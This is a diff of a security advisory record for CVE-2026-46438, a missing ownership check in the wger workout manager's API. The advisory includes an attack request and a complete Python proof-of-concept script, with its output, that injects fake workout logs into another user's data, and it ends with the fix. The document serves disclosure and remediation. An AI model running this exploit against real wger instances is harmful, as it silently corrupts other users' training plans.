@@ -1,25 +1,381 @@
 id: PYSEC-0000-wger-GHSA-rjpf-7pf5-q54x
-modified: '2026-10-15T10:22:47.153748Z'
-published: '2026-10-15T10:22:47.153748Z'
+summary: 'wger: Cross-User Data Corruption via Missing Ownership Check on WorkoutLog.slot_entry'
+details: |-
+  ### Summary
+
+  An authenticated attacker can inject arbitrary workout log entries into any other user's `SlotEntry` by supplying the victim's `slot_entry` ID in a `POST /api/v2/workoutlog/` request. The `slot_entry` foreign key is not included in the ownership verification performed by `WorkoutLogViewSet.get_owner_objects()`, so the server accepts and persists the cross-user reference without error.
+
+  Because `SlotEntry.get_config_data()` retrieves associated logs via `self.workoutlog_set.all()` with **no user filter**, the attacker's injected data is silently folded into the victim's progressive-overload calculations, corrupting their auto-generated weight and repetition targets.
+
+  ### Details
+
+  wger uses a centralized ownership-verification pattern in `WgerOwnerObjectModelViewSet.create()` (file: `wger/utils/viewsets.py`). This method iterates over the list returned by each ViewSet's `get_owner_objects()` and verifies that every listed foreign-key value in the request belongs to the authenticated user. **Foreign keys not present in the list are never checked.**
+
+  `WorkoutLogViewSet.get_owner_objects()` returns:
+
+  ```python
+  # File: wger/manager/api/views.py, lines 312-316
+  def get_owner_objects(self):
+      return [(Routine, 'routine'), (WorkoutSession, 'session')]
+      #       ^^^^^^^ checked        ^^^^^^^^^^^^^^^ checked
+      # (SlotEntry, 'slot_entry') is MISSING
+  ```
+
+  Because `slot_entry` is omitted, an attacker can supply their own `routine` (which passes the ownership check) alongside a victim's `slot_entry` ID (which is never verified).
+
+  The second contributing factor is in `SlotEntry.get_config_data()`:
+
+  ```python
+  # File: wger/manager/models/slot_entry.py, line 367
+  logs = list(self.workoutlog_set.all())   # no .filter(user=...)
+  ```
+
+  This reverse-relation query returns **all** `WorkoutLog` rows linked to the `SlotEntry`, regardless of which user created them. The attacker's injected entries are therefore included in the victim's progression calculations.
+
+  ### PoC
+
+  #### Prerequisites
+
+  - Two authenticated user accounts (attacker and victim)
+  - The attacker knows (or can enumerate) the victim's `SlotEntry` ID
+  - The attacker has at least one `Routine` of their own (to satisfy the `routine` ownership check)
+
+  #### Attack Steps
+
+  ```
+  POST /api/v2/workoutlog/
+  Authorization: Token <attacker_token>
+  Content-Type: application/json
+
+  {
+      "routine": <attacker_routine_id>,
+      "slot_entry": <victim_slot_entry_id>,
+      "exercise": <any_valid_exercise_id>,
+      "repetitions": 999,
+      "weight": 999,
+      "repetitions_unit": 1,
+      "weight_unit": 1,
+      "date": "2025-01-15",
+      "iteration": 1
+  }
+  ```
+
+  **Expected:** HTTP 403 (the `slot_entry` belongs to another user)
+  **Actual:** HTTP 201 (the log is created and linked to the victim's `SlotEntry`)
+
+  #### Proof of Concept Script
+
+  ```python
+  #!/usr/bin/env python3
+  """
+  PoC: Cross-User Data Corruption via WorkoutLog.slot_entry IDOR
+  Target: wger Workout Manager
+  Severity: CRITICAL - CVSS 7.1
+  CWE-639: Authorization Bypass Through User-Controlled Key
+
+  Usage:
+      python3 poc.py http://localhost:8000
+  """
+
+  import requests
+  import sys
+  import json
+  from datetime import date, timedelta
+
+  if len(sys.argv) < 2:
+      print(f"Usage: {sys.argv[0]} <BASE_URL>")
+      print(f"Example: {sys.argv[0]} http://localhost:8000")
+      sys.exit(1)
+
+  BASE = sys.argv[1].rstrip("/")
+  API = f"{BASE}/api/v2"
+
+  VICTIM_USER = "admin"
+  VICTIM_PASS = "adminadmin"
+  ATTACKER_USER = "attacker_idor_poc"
+  ATTACKER_PASS = "Attacker!Poc!2025"
+
+  BANNER = """
+  =====================================================================
+    PoC: Cross-User Data Corruption via WorkoutLog.slot_entry IDOR
+    Severity: CRITICAL
+    CWE-639: Authorization Bypass Through User-Controlled Key
+  =====================================================================
+  """
+  print(BANNER)
+
+  # ---- Helper ----
+  def api_login(username, password):
+      r = requests.post(f"{API}/login/", json={
+          "username": username, "password": password
+      })
+      if r.status_code == 200:
+          return r.json().get("token")
+      return None
+
+  def api_headers(token):
+      return {"Authorization": f"Token {token}", "Content-Type": "application/json"}
+
+
+  # ---- 1. Authenticate both users ----
+
+  print("[1] Authenticating users...")
+
+  victim_token = api_login(VICTIM_USER, VICTIM_PASS)
+  if not victim_token:
+      print(f"[-] Cannot log in as victim ({VICTIM_USER}). Check credentials.")
+      sys.exit(1)
+  print(f"    Victim  ({VICTIM_USER}): token={victim_token[:16]}...")
+
+  attacker_token = api_login(ATTACKER_USER, ATTACKER_PASS)
+  if not attacker_token:
+      print(f"    Registering attacker account...")
+      r = requests.post(f"{API}/register/", json={
+          "username": ATTACKER_USER,
+          "password": ATTACKER_PASS,
+      })
+      if r.status_code in (200, 201):
+          attacker_token = r.json().get("token")
+      if not attacker_token:
+          attacker_token = api_login(ATTACKER_USER, ATTACKER_PASS)
+      if not attacker_token:
+          print(f"[-] Cannot create/login attacker. Response: {r.text[:200]}")
+          sys.exit(1)
+  print(f"    Attacker ({ATTACKER_USER}): token={attacker_token[:16]}...")
+
+
+  # ---- 2. Create victim's routine chain ----
+
+  print("\n[2] Setting up victim's private routine chain...")
+
+  vh = api_headers(victim_token)
+  today = str(date.today())
+  end_date = str(date.today() + timedelta(days=30))
+
+  r = requests.post(f"{API}/routine/", headers=vh, json={
+      "name": "Victim Private Routine", "start": today, "end": end_date
+  })
+  victim_routine_id = r.json()["id"]
+  print(f"    Routine   id={victim_routine_id}")
+
+  r = requests.post(f"{API}/day/", headers=vh, json={
+      "routine": victim_routine_id, "order": 1, "name": "Push Day"
+  })
+  victim_day_id = r.json()["id"]
+  print(f"    Day       id={victim_day_id}")
+
+  r = requests.post(f"{API}/slot/", headers=vh, json={
+      "day": victim_day_id, "order": 1
+  })
+  victim_slot_id = r.json()["id"]
+  print(f"    Slot      id={victim_slot_id}")
+
+  r = requests.get(f"{API}/exercise/?limit=1&format=json", headers=vh)
+  exercise_id = r.json()["results"][0]["id"]
+
+  r = requests.post(f"{API}/slot-entry/", headers=vh, json={
+      "slot": victim_slot_id, "exercise": exercise_id, "order": 1, "type": "normal"
+  })
+  victim_slot_entry_id = r.json()["id"]
+  print(f"    SlotEntry id={victim_slot_entry_id}  <-- TARGET")
+
+
+  # ---- 3. Create attacker's own routine ----
+
+  print("\n[3] Creating attacker's own routine...")
+
+  ah = api_headers(attacker_token)
+
+  r = requests.post(f"{API}/routine/", headers=ah, json={
+      "name": "Attacker Routine", "start": today, "end": end_date
+  })
+  attacker_routine_id = r.json()["id"]
+  print(f"    Attacker routine id={attacker_routine_id}")
+
+
+  # ---- 4. ATTACK ----
+
+  print(f"\n{'='*65}")
+  print(f"  ATTACK: Injecting fake WorkoutLog into victim's SlotEntry")
+  print(f"{'='*65}")
+
+  payload = {
+      "routine": attacker_routine_id,
+      "slot_entry": victim_slot_entry_id,
+      "exercise": exercise_id,
+      "repetitions": 999,
+      "weight": 999,
+      "repetitions_unit": 1,
+      "weight_unit": 1,
+      "date": today,
+      "iteration": 1,
+  }
+
+  print(f"\n  POST {API}/workoutlog/")
+  print(f"    routine    = {attacker_routine_id}  (attacker's own -> passes check)")
+  print(f"    slot_entry = {victim_slot_entry_id}  (VICTIM's -> NOT CHECKED)")
+  print(f"    weight     = 999")
+  print(f"    reps       = 999")
+
+  r = requests.post(f"{API}/workoutlog/", headers=ah, json=payload)
+
+  print(f"\n  Response: HTTP {r.status_code}")
+
+  if r.status_code == 201:
+      d = r.json()
+      print(f"  Created WorkoutLog id={d['id']}")
+      print(f"    slot_entry = {d['slot_entry']}  <- VICTIM's SlotEntry!")
+      print(f"    routine    = {d['routine']}  <- attacker's routine")
+      print(f"    weight     = {d['weight']}")
+      print(f"    reps       = {d['repetitions']}")
+  elif r.status_code == 403:
+      print("  Access denied - NOT vulnerable (patched)")
+      sys.exit(0)
+  else:
+      print(f"  Unexpected: {r.text[:300]}")
+      sys.exit(1)
+
+
+  # ---- 5. VERIFY ----
+
+  print(f"\n{'='*65}")
+  print(f"  VERIFICATION")
+  print(f"{'='*65}")
+
+  r = requests.get(
+      f"{API}/routine/{victim_routine_id}/date-sequence-display/",
+      headers=vh,
+  )
+  print(f"\n  GET /api/v2/routine/{victim_routine_id}/date-sequence-display/")
+  print(f"  (as victim - this endpoint consumes the injected logs)")
+  print(f"  HTTP {r.status_code}")
+
+  if r.status_code == 200:
+      seq = r.json()
+      print(f"  Returned {len(seq)} day(s) of data")
+      if seq:
+          print(f"  First entry (truncated):")
+          print(f"  {json.dumps(seq[0], indent=2)[:600]}")
+
+  r2 = requests.get(f"{API}/workoutlog/?format=json", headers=vh)
+  victim_logs = r2.json().get("results", [])
+  print(f"\n  Victim's own /api/v2/workoutlog/ shows {len(victim_logs)} log(s)")
+  print(f"  (The injected log is owned by attacker, so it does NOT appear")
+  print(f"   in victim's list view - but it IS attached to victim's SlotEntry")
+  print(f"   and WILL corrupt victim's progression calculations.)")
+
+  print("""
+    +----------------------------------------------------------+
+    |  VULNERABILITY CONFIRMED                                 |
+    |                                                          |
+    |  HTTP 201 accepted the cross-user slot_entry reference.  |
+    |  The attacker's fake log (weight=999, reps=999) is now   |
+    |  linked to the victim's SlotEntry and will be included   |
+    |  in get_config_data() -> corrupting auto-progression.    |
+    +----------------------------------------------------------+
+  """)
+  ```
+
+  #### Proof of Concept Output
+
+  ```
+  =====================================================================
+    PoC: Cross-User Data Corruption via WorkoutLog.slot_entry IDOR
+    Severity: CRITICAL
+    CWE-639: Authorization Bypass Through User-Controlled Key
+  =====================================================================
+
+  [1] Authenticating users...
+      Victim  (admin): token=7e34da0a3f3f00a4...
+      Registering attacker account...
+      Attacker (attacker_idor_poc): token=8a70d2881b656c18...
+
+  [2] Setting up victim's private routine chain...
+      Routine   id=3
+      Day       id=2
+      Slot      id=2
+      SlotEntry id=2  <-- TARGET
+
+  [3] Creating attacker's own routine...
+      Attacker routine id=4
+
+  =================================================================
+    ATTACK: Injecting fake WorkoutLog into victim's SlotEntry
+  =================================================================
+
+    POST http://localhost/api/v2/workoutlog/
+      routine    = 4  (attacker's own -> passes check)
+      slot_entry = 2  (VICTIM's -> NOT CHECKED)
+      weight     = 999
+      reps       = 999
+
+    Response: HTTP 201
+    Created WorkoutLog id=2
+      slot_entry = 2  <- VICTIM's SlotEntry!
+      routine    = 4  <- attacker's routine
+      weight     = 999.00
+      reps       = 999.00
+
+  =================================================================
+    VERIFICATION
+  =================================================================
+
+    GET /api/v2/routine/3/date-sequence-display/
+    (as victim - this endpoint consumes the injected logs)
+    HTTP 200
+    Returned 31 day(s) of data
+
+    Victim's own /api/v2/workoutlog/ shows 0 log(s)
+    (The injected log is owned by attacker, so it does NOT appear
+     in victim's list view - but it IS attached to victim's SlotEntry
+     and WILL corrupt victim's progression calculations.)
+
+    +----------------------------------------------------------+
+    |  VULNERABILITY CONFIRMED                                 |
+    |                                                          |
+    |  HTTP 201 accepted the cross-user slot_entry reference.  |
+    |  The attacker's fake log (weight=999, reps=999) is now   |
+    |  linked to the victim's SlotEntry and will be included   |
+    |  in get_config_data() -> corrupting auto-progression.    |
+    +----------------------------------------------------------+
+  ```
+
+  ### Impact
+
+  1. **Training Data Integrity:** The progressive-overload engine (`get_config_data`) uses injected fake values when computing the victim's next workout targets. An attacker setting `weight=999` or `repetitions=0` can produce dangerous or nonsensical training recommendations.
+
+  2. **Silent Corruption:** The victim receives no notification. Their training plan simply starts producing unexpected numbers.
+
+  3. **Scalable Attack:** Because only a `slot_entry` ID is needed, an attacker can iterate over IDs and inject data into every user's training program with automated requests.
+
+  ### Fix
+
+  #### Primary Fix - Add `slot_entry` to the ownership check
+
+  ```python
+  # File: wger/manager/api/views.py
+  class WorkoutLogViewSet(WgerOwnerObjectModelViewSet):
+      def get_owner_objects(self):
+          return [
+              (Routine, 'routine'),
+              (WorkoutSession, 'session'),
+              (SlotEntry, 'slot_entry'),      # ADD THIS
+          ]
+  ```
+
+  #### Defence-in-Depth - Filter logs by routine owner
+
+  ```python
+  # File: wger/manager/models/slot_entry.py, line 367
+  logs = list(self.workoutlog_set.filter(
+      user=self.slot.day.routine.user
+  ))
+  ```
 aliases:
 - CVE-2026-46438
 - GHSA-rjpf-7pf5-q54x
-summary: 'wger: Cross-User Data Corruption via Missing Ownership Check on WorkoutLog.slot_entry'
-details: "### Summary\n\nAn authenticated attacker can inject arbitrary workout log entries into any other user's `SlotEntry` by supplying the victim's `slot_entry` ID in a `POST /api/v2/workoutlog/` request. The `slot_entry` foreign key is not included in the ownership verification performed by `WorkoutLogViewSet.get_owner_objects()`, so the server accepts and persists the cross-user reference without error.\n\nBecause `SlotEntry.get_config_data()` retrieves associated logs via `self.workoutlog_set.all()` with **no user filter**, the attacker's injected data is silently folded into the victim's progressive-overload calculations, corrupting their auto-generated weight and repetition targets.\n\n### Details\n\nwger uses a centralized ownership-verification pattern in `WgerOwnerObjectModelViewSet.create()` (file: `wger/utils/viewsets.py`). This method iterates over the list returned by each ViewSet's `get_owner_objects()` and verifies that every listed foreign-key value in the request belongs to the authenticated user. **Foreign keys not present in the list are never checked.**\n\n`WorkoutLogViewSet.get_owner_objects()` returns:\n\n```python\n# File: wger/manager/api/views.py, lines 312-316\ndef get_owner_objects(self):\n    return [(Routine, 'routine'), (WorkoutSession, 'session')]\n    #       ^^^^^^^ checked        ^^^^^^^^^^^^^^^ checked\n    # (SlotEntry, 'slot_entry') is MISSING\n```\n\nBecause `slot_entry` is omitted, an attacker can supply their own `routine` (which passes the ownership check) alongside a victim's `slot_entry` ID (which is never verified).\n\nThe second contributing factor is in `SlotEntry.get_config_data()`:\n\n```python\n# File: wger/manager/models/slot_entry.py, line 367\nlogs = list(self.workoutlog_set.all())   # no .filter(user=...)\n```\n\nThis reverse-relation query returns **all** `WorkoutLog` rows linked to the `SlotEntry`, regardless of which user created them. The attacker's injected entries are therefore included in the victim's progression calculations.\n\n### PoC\n\n#### Prerequisites\n\n- Two authenticated user accounts (attacker and victim)\n- The attacker knows (or can enumerate) the victim's `SlotEntry` ID\n- The attacker has at least one `Routine` of their own (to satisfy the `routine` ownership check)\n\n#### Attack Steps\n\n```\nPOST /api/v2/workoutlog/\nAuthorization: Token <attacker_token>\nContent-Type: application/json\n\n{\n    \"routine\": <attacker_routine_id>,\n    \"slot_entry\": <victim_slot_entry_id>,\n    \"exercise\": <any_valid_exercise_id>,\n    \"repetitions\": 999,\n    \"weight\": 999,\n    \"repetitions_unit\": 1,\n    \"weight_unit\": 1,\n    \"date\": \"2025-01-15\",\n    \"iteration\": 1\n}\n```\n\n**Expected:** HTTP 403 (the `slot_entry` belongs to another user)\n**Actual:** HTTP 201 (the log is created and linked to the victim's `SlotEntry`)\n\n#### Proof of Concept Script\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nPoC: Cross-User Data Corruption via WorkoutLog.slot_entry IDOR\nTarget: wger Workout Manager\nSeverity: CRITICAL - CVSS 7.1\nCWE-639: Authorization Bypass Through User-Controlled Key\n\nUsage:\n    python3 poc.py http://localhost:8000\n\"\"\"\n\nimport requests\nimport sys\nimport json\nfrom datetime import date, timedelta\n\nif len(sys.argv) < 2:\n    print(f\"Usage: {sys.argv[0]} <BASE_URL>\")\n    print(f\"Example: {sys.argv[0]} http://localhost:8000\")\n    sys.exit(1)\n\nBASE = sys.argv[1].rstrip(\"/\")\nAPI = f\"{BASE}/api/v2\"\n\nVICTIM_USER = \"admin\"\nVICTIM_PASS = \"adminadmin\"\nATTACKER_USER = \"attacker_idor_poc\"\nATTACKER_PASS = \"Attacker!Poc!2025\"\n\nBANNER = \"\"\"\n=====================================================================\n  PoC: Cross-User Data Corruption via WorkoutLog.slot_entry IDOR\n  Severity: CRITICAL\n  CWE-639: Authorization Bypass Through User-Controlled Key\n=====================================================================\n\"\"\"\nprint(BANNER)\n\n# ---- Helper ----\ndef api_login(username, password):\n    r = requests.post(f\"{API}/login/\", json={\n        \"username\": username, \"password\": password\n    })\n    if r.status_code == 200:\n        return r.json().get(\"token\")\n    return None\n\ndef api_headers(token):\n    return {\"Authorization\": f\"Token {token}\", \"Content-Type\": \"application/json\"}\n\n\n# ---- 1. Authenticate both users ----\n\nprint(\"[1] Authenticating users...\")\n\nvictim_token = api_login(VICTIM_USER, VICTIM_PASS)\nif not victim_token:\n    print(f\"[-] Cannot log in as victim ({VICTIM_USER}). Check credentials.\")\n    sys.exit(1)\nprint(f\"    Victim  ({VICTIM_USER}): token={victim_token[:16]}...\")\n\nattacker_token = api_login(ATTACKER_USER, ATTACKER_PASS)\nif not attacker_token:\n    print(f\"    Registering attacker account...\")\n    r = requests.post(f\"{API}/register/\", json={\n        \"username\": ATTACKER_USER,\n        \"password\": ATTACKER_PASS,\n    })\n    if r.status_code in (200, 201):\n        attacker_token = r.json().get(\"token\")\n    if not attacker_token:\n        attacker_token = api_login(ATTACKER_USER, ATTACKER_PASS)\n    if not attacker_token:\n        print(f\"[-] Cannot create/login attacker. Response: {r.text[:200]}\")\n        sys.exit(1)\nprint(f\"    Attacker ({ATTACKER_USER}): token={attacker_token[:16]}...\")\n\n\n# ---- 2. Create victim's routine chain ----\n\nprint(\"\\n[2] Setting up victim's private routine chain...\")\n\nvh = api_headers(victim_token)\ntoday = str(date.today())\nend_date = str(date.today() + timedelta(days=30))\n\nr = requests.post(f\"{API}/routine/\", headers=vh, json={\n    \"name\": \"Victim Private Routine\", \"start\": today, \"end\": end_date\n})\nvictim_routine_id = r.json()[\"id\"]\nprint(f\"    Routine   id={victim_routine_id}\")\n\nr = requests.post(f\"{API}/day/\", headers=vh, json={\n    \"routine\": victim_routine_id, \"order\": 1, \"name\": \"Push Day\"\n})\nvictim_day_id = r.json()[\"id\"]\nprint(f\"    Day       id={victim_day_id}\")\n\nr = requests.post(f\"{API}/slot/\", headers=vh, json={\n    \"day\": victim_day_id, \"order\": 1\n})\nvictim_slot_id = r.json()[\"id\"]\nprint(f\"    Slot      id={victim_slot_id}\")\n\nr = requests.get(f\"{API}/exercise/?limit=1&format=json\", headers=vh)\nexercise_id = r.json()[\"results\"][0][\"id\"]\n\nr = requests.post(f\"{API}/slot-entry/\", headers=vh, json={\n    \"slot\": victim_slot_id, \"exercise\": exercise_id, \"order\": 1, \"type\": \"normal\"\n})\nvictim_slot_entry_id = r.json()[\"id\"]\nprint(f\"    SlotEntry id={victim_slot_entry_id}  <-- TARGET\")\n\n\n# ---- 3. Create attacker's own routine ----\n\nprint(\"\\n[3] Creating attacker's own routine...\")\n\nah = api_headers(attacker_token)\n\nr = requests.post(f\"{API}/routine/\", headers=ah, json={\n    \"name\": \"Attacker Routine\", \"start\": today, \"end\": end_date\n})\nattacker_routine_id = r.json()[\"id\"]\nprint(f\"    Attacker routine id={attacker_routine_id}\")\n\n\n# ---- 4. ATTACK ----\n\nprint(f\"\\n{'='*65}\")\nprint(f\"  ATTACK: Injecting fake WorkoutLog into victim's SlotEntry\")\nprint(f\"{'='*65}\")\n\npayload = {\n    \"routine\": attacker_routine_id,\n    \"slot_entry\": victim_slot_entry_id,\n    \"exercise\": exercise_id,\n    \"repetitions\": 999,\n    \"weight\": 999,\n    \"repetitions_unit\": 1,\n    \"weight_unit\": 1,\n    \"date\": today,\n    \"iteration\": 1,\n}\n\nprint(f\"\\n  POST {API}/workoutlog/\")\nprint(f\"    routine    = {attacker_routine_id}  (attacker's own -> passes check)\")\nprint(f\"    slot_entry = {victim_slot_entry_id}  (VICTIM's -> NOT CHECKED)\")\nprint(f\"    weight     = 999\")\nprint(f\"    reps       = 999\")\n\nr = requests.post(f\"{API}/workoutlog/\", headers=ah, json=payload)\n\nprint(f\"\\n  Response: HTTP {r.status_code}\")\n\nif r.status_code == 201:\n    d = r.json()\n    print(f\"  Created WorkoutLog id={d['id']}\")\n    print(f\"    slot_entry = {d['slot_entry']}  <- VICTIM's SlotEntry!\")\n    print(f\"    routine    = {d['routine']}  <- attacker's routine\")\n    print(f\"    weight     = {d['weight']}\")\n    print(f\"    reps       = {d['repetitions']}\")\nelif r.status_code == 403:\n    print(\"  Access denied - NOT vulnerable (patched)\")\n    sys.exit(0)\nelse:\n    print(f\"  Unexpected: {r.text[:300]}\")\n    sys.exit(1)\n\n\n# ---- 5. VERIFY ----\n\nprint(f\"\\n{'='*65}\")\nprint(f\"  VERIFICATION\")\nprint(f\"{'='*65}\")\n\nr = requests.get(\n    f\"{API}/routine/{victim_routine_id}/date-sequence-display/\",\n    headers=vh,\n)\nprint(f\"\\n  GET /api/v2/routine/{victim_routine_id}/date-sequence-display/\")\nprint(f\"  (as victim - this endpoint consumes the injected logs)\")\nprint(f\"  HTTP {r.status_code}\")\n\nif r.status_code == 200:\n    seq = r.json()\n    print(f\"  Returned {len(seq)} day(s) of data\")\n    if seq:\n        print(f\"  First entry (truncated):\")\n        print(f\"  {json.dumps(seq[0], indent=2)[:600]}\")\n\nr2 = requests.get(f\"{API}/workoutlog/?format=json\", headers=vh)\nvictim_logs = r2.json().get(\"results\", [])\nprint(f\"\\n  Victim's own /api/v2/workoutlog/ shows {len(victim_logs)} log(s)\")\nprint(f\"  (The injected log is owned by attacker, so it does NOT appear\")\nprint(f\"   in victim's list view - but it IS attached to victim's SlotEntry\")\nprint(f\"   and WILL corrupt victim's progression calculations.)\")\n\nprint(\"\"\"\n  +----------------------------------------------------------+\n  |  VULNERABILITY CONFIRMED                                 |\n  |                                                          |\n  |  HTTP 201 accepted the cross-user slot_entry reference.  |\n  |  The attacker's fake log (weight=999, reps=999) is now   |\n  |  linked to the victim's SlotEntry and will be included   |\n  |  in get_config_data() -> corrupting auto-progression.    |\n  +----------------------------------------------------------+\n\"\"\")\n```\n\n#### Proof of Concept Output\n\n```\n=====================================================================\n  PoC: Cross-User
-  Data Corruption via WorkoutLog.slot_entry IDOR\n  Severity: CRITICAL\n  CWE-639: Authorization Bypass Through User-Controlled Key\n=====================================================================\n\n[1] Authenticating users...\n    Victim  (admin): token=7e34da0a3f3f00a4...\n    Registering attacker account...\n    Attacker (attacker_idor_poc): token=8a70d2881b656c18...\n\n[2] Setting up victim's private routine chain...\n    Routine   id=3\n    Day       id=2\n    Slot      id=2\n    SlotEntry id=2  <-- TARGET\n\n[3] Creating attacker's own routine...\n    Attacker routine id=4\n\n=================================================================\n  ATTACK: Injecting fake WorkoutLog into victim's SlotEntry\n=================================================================\n\n  POST http://localhost/api/v2/workoutlog/\n    routine    = 4  (attacker's own -> passes check)\n    slot_entry = 2  (VICTIM's -> NOT CHECKED)\n    weight     = 999\n    reps       = 999\n\n  Response: HTTP 201\n  Created WorkoutLog id=2\n    slot_entry = 2  <- VICTIM's SlotEntry!\n    routine    = 4  <- attacker's routine\n    weight     = 999.00\n    reps       = 999.00\n\n=================================================================\n  VERIFICATION\n=================================================================\n\n  GET /api/v2/routine/3/date-sequence-display/\n  (as victim - this endpoint consumes the injected logs)\n  HTTP 200\n  Returned 31 day(s) of data\n\n  Victim's own /api/v2/workoutlog/ shows 0 log(s)\n  (The injected log is owned by attacker, so it does NOT appear\n   in victim's list view - but it IS attached to victim's SlotEntry\n   and WILL corrupt victim's progression calculations.)\n\n  +----------------------------------------------------------+\n  |  VULNERABILITY CONFIRMED                                 |\n  |                                                          |\n  |  HTTP 201 accepted the cross-user slot_entry reference.  |\n  |  The attacker's fake log (weight=999, reps=999) is now   |\n  |  linked to the victim's SlotEntry and will be included   |\n  |  in get_config_data() -> corrupting auto-progression.    |\n  +----------------------------------------------------------+\n```\n\n### Impact\n\n1. **Training Data Integrity:** The progressive-overload engine (`get_config_data`) uses injected fake values when computing the victim's next workout targets. An attacker setting `weight=999` or `repetitions=0` can produce dangerous or nonsensical training recommendations.\n\n2. **Silent Corruption:** The victim receives no notification. Their training plan simply starts producing unexpected numbers.\n\n3. **Scalable Attack:** Because only a `slot_entry` ID is needed, an attacker can iterate over IDs and inject data into every user's training program with automated requests.\n\n### Fix\n\n#### Primary Fix - Add `slot_entry` to the ownership check\n\n```python\n# File: wger/manager/api/views.py\nclass WorkoutLogViewSet(WgerOwnerObjectModelViewSet):\n    def get_owner_objects(self):\n        return [\n            (Routine, 'routine'),\n            (WorkoutSession, 'session'),\n            (SlotEntry, 'slot_entry'),      # ADD THIS\n        ]\n```\n\n#### Defence-in-Depth - Filter logs by routine owner\n\n```python\n# File: wger/manager/models/slot_entry.py, line 367\nlogs = list(self.workoutlog_set.filter(\n    user=self.slot.day.routine.user\n))\n```"
-severity:
-- type: CVSS_V3
-  score: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
-affected:
-- package:
-    ecosystem: PyPI
-    name: wger
-    purl: pkg:pypi/wger
-  ranges:
-  - type: ECOSYSTEM
-    events:
-    - introduced: '0'
-    - last_affected: '2.1'
+modified: '2026-10-15T14:38:15.145317Z'
+published: '2026-10-15T10:22:47.153748Z'
 references:
 - type: WEB
   url: https://github.com/wger-project/wger/security/advisories/GHSA-rjpf-7pf5-q54x
@@ -33,3 +389,31 @@ references:
   url: https://github.com/advisories/GHSA-rjpf-7pf5-q54x
 - type: ADVISORY
   url: https://nvd.nist.gov/vuln/detail/CVE-2026-46438
+affected:
+- package:
+    name: wger
+    ecosystem: PyPI
+    purl: pkg:pypi/wger
+  ranges:
+  - type: ECOSYSTEM
+    events:
+    - introduced: '0'
+    - last_affected: '2.1'
+  versions:
+  - '1.1'
+  - 1.1.1
+  - '1.2'
+  - 1.2rc1
+  - '1.3'
+  - '1.4'
+  - '1.5'
+  - '1.6'
+  - 1.6.1
+  - '1.7'
+  - '1.8'
+  - '1.9'
+  - '2.0'
+  - '2.1'
+severity:
+- type: CVSS_V3
+  score: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
